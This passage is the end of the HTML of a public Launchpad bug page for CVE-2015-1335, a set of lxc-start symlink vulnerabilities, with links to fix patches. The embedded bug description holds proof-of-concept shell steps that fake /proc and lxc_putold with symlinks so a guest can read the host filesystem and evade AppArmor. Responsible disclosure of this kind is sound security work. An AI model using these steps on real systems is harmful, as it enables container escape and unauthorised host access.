      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4467949/+files/0001-Protect-container-mounts-against-symlinks.patch">hopefully final patch (with manpage update) against git HEAD</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4467949">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4468090/+files/0001-Protect-container-mounts-against-symlinks.patch">Patch against git head</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4468090">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4471605/+files/0001-Protect-container-mounts-against-symlinks.patch">patch against 1.0.7</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4471605">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4471606/+files/0001-Protect-container-mounts-against-symlinks.patch">Patch against 1.1.2</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4471606">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4471609/+files/0001-Protect-container-mounts-against-symlinks.patch">patch against 1.1.3</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4471609">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4471610/+files/0001-Protect-container-mounts-against-symlinks.patch">patch against stable-1.0</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4471610">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4471611/+files/0001-Protect-container-mounts-against-symlinks.patch">patch against stable-1.1</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4471611">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4529631/+files/CVE-2015-1335.patch">Backport fix for CVE-2015-1335 to LXC 0.7.x (Ubuntu 12.04 / Debian squeeze-lts)</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4529631">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/ubuntu/+source/lxc/+bug/1476662/+addcomment?field.patch=on">Add patch</a>
      </li>
    </ul>
  </div>
  <div class="portlet" id="portlet-attachments">
    <h2>Bug attachments</h2>
    <ul>
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4432063/+files/strace-lxc-master-bin-true">strace-lxc-master-bin-true</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4432063">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/ubuntu/+source/lxc/+bug/1476662/+addcomment">Add attachment</a>
      </li>
    </ul>
  </div>


      

    
          </div><!-- yui-b side -->
        
      </div><!-- yui-t4 -->

      
  <div id="footer" class="footer">
    <div class="lp-arcana">
        <div class="lp-branding">
          <a href="https://launchpad.net/"><img src="/@@/launchpad-logo-and-name-hierarchy.png" alt="Launchpad" /></a>
          &nbsp;&bull;&nbsp;
          <a href="https://launchpad.net/+tour">Take the tour</a>
          &nbsp;&bull;&nbsp;
          <a href="https://help.launchpad.net/">Read the guide</a>
          &nbsp;
          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
            <input type="search" id="search-text" name="field.text" />
            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
          </form>
        </div>
        
  

    </div>

    <div class="colophon">
      &copy; 2004-2021
      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
      &nbsp;&bull;&nbsp;
      <a href="https://launchpad.net/legal">Terms of use</a>
      &nbsp;&bull;&nbsp;
      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
      &nbsp;&bull;&nbsp;
      <a href="/feedback">Contact Launchpad Support</a>
      
      &nbsp;&bull;&nbsp;
      <a href="http://blog.launchpad.net/">Blog</a>
      
	&nbsp;&bull;&nbsp;
	<a href="https://canonical.com/careers">Careers</a>
      
      &nbsp;&bull;&nbsp;
      <a href="https://twitter.com/launchpadstatus">System status</a>
      <span id="lp-version">
      &nbsp;&bull;&nbsp;
        r0d8de2b
        
        
        (<a href="https://dev.launchpad.net/">Get the code!</a>)
      </span>
    </div>
  </div>

    </div><!-- yui-d0-->

    
  
  
  <script id="json-cache-script">LP.cache = {"initial_comment_batch_offset": 41, "first visible_recent_comment": 39, "related_features": {}, "subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/1476662", "self_link": "https://bugs.launchpad.net/api/devel/bugs/1476662"}, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/1476662", "web_link": "https://bugs.launchpad.net/bugs/1476662", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 1476662, "private": false, "information_type": "Public Security", "name": null, "title": "lxc-start symlink vulnerabilities may allow guest to read host filesystem, interfere with apparmor", "description": "lxc-start shuffles around mounts using helper directory /usr/lib/x86_64-linux-gnu/lxc (guest root fs is mounted here)\n\nIt then modifies mounts operating in guest root directory before invoking init. As it does not check if all mount points are directories, a malicious guest may modify its internal structure before shutdown (or was created using manipulated image) and then when started again, guest may\n\n* Access  the whole host root filesystem\n\n* Block switching from lxc-start apparmor profile to lxc-container-default\n\n\n# Real putold before pivot-root (root fs will end here)\nmkdir -p /x/lxc_putold\n\n# Faked putold\nln -s /usr/lib/x86_64-linux-gnu/lxc/x/lxc_putold lxc_putold\nmkdir -p /usr/lib/x86_64-linux-gnu/lxc/x/lxc_putold/proc\ntouch /usr/lib/x86_64-linux-gnu/lxc/x/lxc_putold/proc/mounts\n\n\n# proc fake\nmkdir -p /x/proc\numount /proc\nrmdir /proc\nln -s /usr/lib/x86_64-linux-gnu/lxc/x/proc proc\n\nmkdir -p /usr/lib/x86_64-linux-gnu/lxc/x/proc/1/attr /usr/lib/x86_64-linux-gnu/lxc/x/proc/self\ntouch /usr/lib/x86_64-linux-gnu/lxc/x/proc/1/attr/current\ntouch /usr/lib/x86_64-linux-gnu/lxc/x/proc/self/status\n\n\n\nThe  issue was also found during https://service.ait.ac.at/security/2015/LxcSecurityAnalysis.html", "owner_link": "https://bugs.launchpad.net/api/devel/~roman-fiedler-deactivatedaccount", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/bug_tasks", "duplicate_of_link": null, "date_created": "2015-07-21T13:16:51.663837+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/subscriptions", "date_last_updated": "2016-01-06T16:24:24.112350+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 264, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/cves", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/attachments", "security_related": true, "latest_patch_uploaded": "2015-12-04T15:31:59.694019+00:00", "tags": [], "date_last_message": "2016-01-06T16:24:22.778716+00:00", "number_of_duplicates": 0, "message_count": 80, "users_affected_count": 1, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/users_unaffected", "users_affected_count_with_dupes": 1, "other_users_affected_count_with_dupes": 1, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/messages", "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1476662/linked_merge_proposals", "http_etag": "\"8197f6f9e22eed14a57e79bc86878805dc0583f3-02d37d9d7a7e64dd95cdbd278ff2585c302e5734\""}, "bugtask_data": {"1877816": {"milestone_widget_items": "[]", "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+delete", "user_can_edit_status": true, "bugtask_path": "/ubuntu/+source/lxc/+bug/1476662", "row_id": "tasksummary1877816", "importance_value": "High", "importance_widget_items": "[]", "id": 1877816, "user_can_delete": false, "targetname": "lxc (Ubuntu)", "user_can_edit_importance": false, "assignee_vocabulary_filters": [], "bug_title": "lxc-start symlink vulnerabilities may allow guest to read host filesystem, interfere with apparmor", "assignee_value": null, "hide_assignee_team_selection": true, "user_can_edit_assignee": false, "form_row_id": "task1877816", "target_is_product": false, "assignee_is_team": null, "status_value": "Fix Released", "user_can_unassign": false, "milestone_value": null, "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_milestone": false, "prefix": "ubuntu_lxc"}}, "bug_is_private": false, "context": {"self_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/lxc/+bug/1476662", "web_link": "https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/1476662", "milestone_link": null, "status": "Fix Released", "importance": "High", "assignee_link": null, "bug_target_display_name": "lxc (Ubuntu)", "bug_target_name": "lxc (Ubuntu)", "bug_watch_link": null, "date_assigned": null, "date_created": "2015-07-21T13:16:51.663837+00:00", "date_confirmed": "2015-09-01T18:08:11.109593+00:00", "date_incomplete": null, "date_in_progress": "2015-09-01T18:08:11.109593+00:00", "date_closed": "2015-09-29T15:41:09.693820+00:00", "date_left_new": "2015-09-01T18:08:11.109593+00:00", "date_triaged": "2015-09-01T18:08:11.109593+00:00", "date_fix_committed": "2015-09-29T15:41:09.693820+00:00", "date_fix_released": "2015-09-29T15:41:09.693820+00:00", "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~roman-fiedler-deactivatedaccount", "target_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/lxc", "title": "Bug #1476662 in lxc (Ubuntu): \"lxc-start symlink vulnerabilities may allow guest to read host filesystem, interfere with apparmor\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/lxc/+bug/1476662/related_tasks", "is_complete": true, "http_etag": "\"d675f76692bde5a9d8ca12122a8c40dc4829a740-b4ddb852219bc1a3d8d84919871c16d179a1d217\""}, "information_type_data": {"PUBLIC": {"value": "PUBLIC", "is_private": false, "order": 0, "name": "Public", "description": "Everyone can see this information.\n", "description_css_class": "choice-description"}, "PRIVATESECURITY": {"value": "PRIVATESECURITY", "is_private": true, "order": 2, "name": "Private Security", "description": "Only the security group can see this information.\n ", "description_css_class": "choice-description"}, "USERDATA": {"value": "USERDATA", "is_private": true, "order": 3, "name": "Private", "description": "Only shared with users permitted to see private user information.\n", "description_css_class": "choice-description"}, "PUBLICSECURITY": {"value": "PUBLICSECURITY", "is_private": false, "order": 1, "name": "Public Security", "description": "Everyone can see this security related information.\n", "description_css_class": "choice-description"}}, "total_comments_and_activity": 126};</script>

    
  

    
  </body>


  <!--
    Facet name: bugs
    Page type: main_side
    Has global search: True
    Has application tabs: True
    Has side portlets: True

    At least 62 queries/external actions issued in 1.10 seconds

    Features: {'bugs.nominations.bug_supervisors_can_target': 'on', 'hard_timeout': '9000', 'visible_render_time': None, 'bugs.affected_count_includes_dupes.disabled': None, 'app.mainsite_only.canonical_url': None, 'app.maintenance_message': None, 'js.yui_version': None, 'disclosure.dsp_picker.enabled': 'on', 'profiling.enabled': None, 'baselayout.careers_link.disabled': None}

    r0d8de2b

    -->

</html>

